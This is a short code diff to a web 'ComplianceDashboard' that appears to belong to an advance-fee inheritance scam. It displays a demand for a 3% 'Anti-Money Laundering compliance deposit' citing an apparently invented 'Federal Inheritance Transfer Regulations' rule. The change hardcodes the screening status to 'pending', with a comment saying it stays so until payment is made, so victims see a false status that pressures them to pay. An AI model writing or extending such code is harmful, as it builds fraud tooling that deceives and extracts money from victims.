@@ -138,7 +138,8 @@ const ComplianceDashboard = () => {
     { 
       title: "AML Screening", 
       description: `Under Federal Inheritance Transfer Regulations (31 CFR § 103.22), a 3% Anti-Money Laundering compliance deposit of $${amlFeeAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })} is required prior to fund disbursement.`,
-      status: complianceCase.aml_screening,
+      status: "pending", // Always pending until payment is made
+      isPending: true,
     },
   ].map(item => ({
     ...item,
